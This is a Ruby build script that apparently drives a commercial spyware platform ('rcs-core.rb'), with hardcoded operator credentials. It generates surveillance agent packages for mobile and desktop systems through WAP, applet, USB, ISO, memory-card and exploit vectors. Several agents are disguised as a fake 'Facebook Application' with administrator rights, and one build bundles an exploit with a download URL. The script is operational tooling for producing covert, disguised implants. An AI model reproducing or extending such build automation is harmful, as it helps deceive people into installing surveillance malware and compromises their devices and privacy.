#!/usr/bin/env ruby
require 'json'

USER = 'alor'
PASS = 'demorcss'
FACTORY = 'RCS_0000000001'
DB = 'rcs-castore'
DEMO = true

ver = DEMO ? '_demo' : ''

puts "Building all complex..."
###################################################################################################
params = {platform: 'wap',
          generate: {platforms: ['blackberry', 'android', 'winmo'],
                     binary: {demo: DEMO, admin: true},
                     melt: {admin: true,
                            appname: 'facebook',
                            name: 'Facebook Application',
                            desc: 'Applicazione utilissima di social network',
                            vendor: 'face inc',
                            version: '1.2.3'},
                     sign: {edition: '5th3rd'}
                    }
          }

File.open('build.json', 'w') {|f| f.write params.to_json}
system "ruby ./rcs-core.rb -u #{USER} -p #{PASS} -d #{DB} -f #{FACTORY} -b build.json -o wap#{ver}.zip"
###################################################################################################
params = {platform: 'applet',
          generate: {platforms: ['osx', 'windows'],
                     binary: {demo: DEMO, admin: false},
                     melt: {admin: false}
                    },
          melt: {appname: 'facebook'}
          }

File.open('build.json', 'w') {|f| f.write params.to_json}
system "ruby ./rcs-core.rb -u #{USER} -p #{PASS} -d #{DB} -f #{FACTORY} -b build.json -o applet#{ver}.zip"
###################################################################################################
params = {platform: 'card',
          generate: {platforms: ['winmo'],
                     binary: {demo: DEMO}
                    }
          }

File.open('build.json', 'w') {|f| f.write params.to_json}
system "ruby ./rcs-core.rb -u #{USER} -p #{PASS} -d #{DB} -f #{FACTORY} -b build.json -o card#{ver}.zip"
###################################################################################################
params = {platform: 'u3',
          generate: {platforms: ['windows'],
                     binary: {demo: DEMO},
                     melt: {admin: false}
                    }
          }

File.open('build.json', 'w') {|f| f.write params.to_json}
system "ruby ./rcs-core.rb -u #{USER} -p #{PASS} -d #{DB} -f #{FACTORY} -b build.json -o u3#{ver}.zip"
###################################################################################################
params = {platform: 'iso',
          generate: {platforms: ['osx', 'windows'],
                     binary: {demo: DEMO}
                    }
          }

File.open('build.json', 'w') {|f| f.write params.to_json}
system "ruby ./rcs-core.rb -u #{USER} -p #{PASS} -d #{DB} -f #{FACTORY} -b build.json -o offline#{ver}.zip"
###################################################################################################
params = {platform: 'usb',
          generate: {binary: {demo: DEMO, admin: false},
                     melt: {admin: false}
                    }
          }

File.open('build.json', 'w') {|f| f.write params.to_json}
system "ruby ./rcs-core.rb -u #{USER} -p #{PASS} -d #{DB} -f #{FACTORY} -b build.json -o usb#{ver}.zip"
###################################################################################################
params = {platform: 'exploit',
          generate: {exploit: 'HT-2012-000',
                     platforms: ['osx', 'windows'],
                     binary: {demo: DEMO, admin: false},
                     melt: {admin: false}
                    },
          melt: {appname: 'facebook',
                 url: 'http://download.me/'}
          }

File.open('build.json', 'w') {|f| f.write params.to_json}
system "ruby ./rcs-core.rb -u #{USER} -p #{PASS} -d #{DB} -f #{FACTORY} -b build.json -o exploit#{ver}.zip"
###################################################################################################
puts "End"
